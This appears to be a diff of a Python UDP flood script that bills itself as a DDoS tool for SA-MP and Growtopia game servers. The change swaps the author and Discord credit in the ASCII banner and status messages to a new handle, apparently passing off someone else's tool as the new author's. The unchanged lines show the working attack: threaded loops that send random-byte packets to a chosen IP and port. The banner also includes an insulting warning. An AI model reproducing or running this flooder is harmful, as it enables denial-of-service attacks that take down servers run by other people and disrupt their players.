@@ -35,7 +35,7 @@ os.system("clear")
 
 print("""
 \u001b[35m
-Codeid By XD3MP;SAMP
+Codeid By V1NZ;SAMP
 
 ██╗░░██╗██████╗░███████╗███╗░░░███╗██████╗░
 ╚██╗██╔╝██╔══██╗██╔════╝████╗░████║██╔══██╗
@@ -45,7 +45,7 @@ Codeid By XD3MP;SAMP
 ╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░░░░╚═╝╚═╝░░░░░ """)
 print("""\u001b[37m
 WELCOME TO MY TOOLS
->> MY DISCORD : XD3MP:SAMP#2208
+>> MY DISCORD : V1NZ;SAMP#2208
 >> DDOS TOOLS FOR SAMP AND GTPS
 >> DON'T ABUSE THIS TOOLS BITCH
 """)
@@ -67,9 +67,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" \u001b[31mThreads To|\u001b[35mIP AND PORT %s:%s|\u001b[31mPackets XD3MP;SAMP Nuklir V4 Meluncur"%(ip,port))
+			print(i +" \u001b[31mThreads To|\u001b[35mIP AND PORT %s:%s|\u001b[31mPackets V1NZ;SAMP Nuklir V4 Meluncur"%(ip,port))
 		except:
-			print("[ 1 ] Packets Dari XD3MP;SAMP Udh Berhenti!!!")
+			print("[ 1 ] Packets Dari V1NZ;SAMP Udh Berhenti!!!")
 
 def run2():
 	data = random._urandom(16)
@@ -84,7 +84,7 @@ def run2():
 			print(i +" \u001b[31mThreads To|\u001b[35mIP AND PORT %s:%s|\u001b[31mPackets XD3MP;SAMP Nuklir V4 Meluncur"%(ip,port))
 		except:
 			s.close()
-			print("[ 2 ] Packets Dari XD3MP;SAMP Udh Berhenti!!!")
+			print("[ 2 ] Packets Dari V1NZ;SAMP Udh Berhenti!!!")
             
 for y in range(threads):
 	if choice == 'y':
